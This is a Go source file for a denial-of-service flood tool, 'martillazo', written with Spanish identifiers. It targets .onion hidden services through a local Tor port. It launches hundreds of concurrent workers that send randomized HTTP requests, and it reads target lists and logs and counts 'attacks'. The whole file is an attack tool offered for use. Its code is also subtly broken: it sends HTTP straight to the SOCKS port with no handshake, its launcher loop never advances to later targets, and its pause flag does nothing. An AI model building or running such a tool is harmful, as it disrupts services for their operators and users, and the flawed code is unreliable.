package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

var (
	onionHost    string
	maxThreads   int
	activeThreads int
	lock         sync.Mutex
	PORT         = 80
	SOCKS_PORT   = 9050
	ataquesEnviados int
	erroresConn  int
	logFile      *os.File
	objetivos    []string
	pausado      bool
	reintentosMax = 3
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1",
	"python-requests/2.31", "Go-http-client/1.1", "libwww-perl/6.66",
}
var referers = []string{
	"http://duckduckgo.com", "http://protonmail.com",
	"http://facebookcorewwwi.onion", "http://torproject.org",
}
var metodos = []string{"GET", "POST", "HEAD", "OPTIONS", "TRACE"}

func generarPayload() string {
	metodo := metodos[rand.Intn(len(metodos))]
	ruta := fmt.Sprintf("/alpha/%d", rand.Intn(90000)+10000)
	ua := userAgents[rand.Intn(len(userAgents))]
	ref := referers[rand.Intn(len(referers))]
	headers := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferer: %s\r\nAccept-Encoding: gzip, deflate\r\nX-Martillazo: %d\r\nConnection: keep-alive\r\n",
		metodo, ruta, onionHost, ua, ref, rand.Intn(999999)+1)
	if metodo == "POST" {
		body := fmt.Sprintf("param=%d&data=%s", rand.Intn(999999)+1, strings.Repeat("A", rand.Intn(251)+50))
		headers += fmt.Sprintf("Content-Length: %d\r\n\r\n%s", len(body), body)
	} else {
		headers += "\r\n"
	}
	return headers
}

func logAtaque(msg string) {
	if logFile != nil {
		logFile.WriteString(fmt.Sprintf("%s [%s]\n", time.Now().Format(time.RFC3339), msg))
	}
}

func martillazo() {
	defer func() {
		lock.Lock()
		activeThreads--
		lock.Unlock()
	}()
	var err error
	for intento := 0; intento < reintentosMax; intento++ {
		conn, errDial := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", SOCKS_PORT), 8*time.Second)
		if errDial != nil {
			lock.Lock()
			erroresConn++
			lock.Unlock()
			logAtaque(fmt.Sprintf("Error conexión (intento %d): %v", intento+1, errDial))
			time.Sleep(1 * time.Second)
			err = errDial
			continue
		}
		conn.SetDeadline(time.Now().Add(8 * time.Second))
		payload := generarPayload()
		_, errWrite := conn.Write([]byte(payload))
		conn.Close()
		if errWrite != nil {
			lock.Lock()
			erroresConn++
			lock.Unlock()
			logAtaque(fmt.Sprintf("Error envío: %v", errWrite))
			err = errWrite
			continue
		}
		lock.Lock()
		ataquesEnviados++
		lock.Unlock()
		logAtaque(fmt.Sprintf("Ataque enviado [%s]", time.Now().Format("15:04:05")))
		fmt.Printf("[%s] Ataque #%d enviado\n", time.Now().Format("15:04:05"), ataquesEnviados)
		break
	}
	if err != nil {
		fmt.Printf("[!] Error persistente al enviar ataque: %v\n", err)
	}
}

func lanzador() {
	for {
		lock.Lock()
		libres := maxThreads - activeThreads
		lock.Unlock()
		for i := 0; i < libres; i++ {
			lock.Lock()
			activeThreads++
			lock.Unlock()
			go martillazo()
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func cargarObjetivosDesdeArchivo(path string) []string {
	var lista []string
	f, err := os.Open(path)
	if err != nil {
		fmt.Println("No se pudo abrir el archivo de objetivos:", err)
		return lista
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lista = append(lista, line)
		}
	}
	return lista
}

func mostrarAyudaExtendida() {
	fmt.Println("Uso extendido:")
	fmt.Println("  -host <dominio.onion> [-t 800]")
	fmt.Println("  -targets <archivo.txt>  (para múltiples objetivos)")
	fmt.Println("  -log <archivo>          (para registrar ataques)")
	fmt.Println("  -help                   (muestra esta ayuda)")
}

func main() {
	flag.StringVar(&onionHost, "host", "", "Dominio .onion v3")
	flag.IntVar(&maxThreads, "t", 800, "Hilos máximos")
	var logPath string
	flag.StringVar(&logPath, "log", "", "Archivo para registrar ataques (opcional)")
	var targetsFile string
	var showHelp bool
	flag.StringVar(&targetsFile, "targets", "", "Archivo con lista de objetivos .onion")
	flag.BoolVar(&showHelp, "help", false, "Mostrar ayuda extendida")
	flag.Parse()
	if showHelp {
		mostrarAyudaExtendida()
		os.Exit(0)
	}
	if targetsFile != "" {
		objetivos = cargarObjetivosDesdeArchivo(targetsFile)
	} else if onionHost != "" {
		objetivos = []string{onionHost}
	}
	if len(objetivos) == 0 {
		fmt.Println("Debes especificar al menos un objetivo con -host o -targets")
		os.Exit(1)
	}
	fmt.Printf("\n🔨 martillazo_alpha_simple.go atacando a %s\n", onionHost)
	fmt.Printf("🚇 Usando solo Tor por puerto %d | Hilos máximos: %d\n\n", SOCKS_PORT, maxThreads)
	var err error
	if logPath != "" {
		logFile, err = os.Create(logPath)
		if err != nil {
			fmt.Println("No se pudo crear el archivo de log:", err)
		}
		defer logFile.Close()
	}
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		<-c
		fmt.Printf("\n\n[Resumen] Ataques enviados: %d | Errores de conexión: %d\n", ataquesEnviados, erroresConn)
		if logFile != nil {
			fmt.Println("[+] Log guardado en:", logPath)
		}
		os.Exit(0)
	}()
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print("[PAUSA/ESTAD] Escribe 'p' para pausar/reanudar, 's' para estadísticas: ")
			txt, _ := reader.ReadString('\n')
			txt = strings.TrimSpace(txt)
			if txt == "p" {
				pausado = !pausado
				if pausado {
					fmt.Println("Ataque pausado.")
				} else {
					fmt.Println("Ataque reanudado.")
				}
			}
			if txt == "s" {
				lock.Lock()
				fmt.Printf("[ESTAD] Ataques enviados: %d | Errores: %d | Hilos activos: %d\n", ataquesEnviados, erroresConn, activeThreads)
				lock.Unlock()
			}
		}
	}()
	for _, objetivo := range objetivos {
		onionHost = objetivo
		fmt.Printf("\n[🔨] Atacando objetivo: %s\n", onionHost)
		lanzador()
		fmt.Printf("[Resumen objetivo %s] Ataques: %d | Errores: %d\n", onionHost, ataquesEnviados, erroresConn)
		ataquesEnviados, erroresConn = 0, 0
	}
}
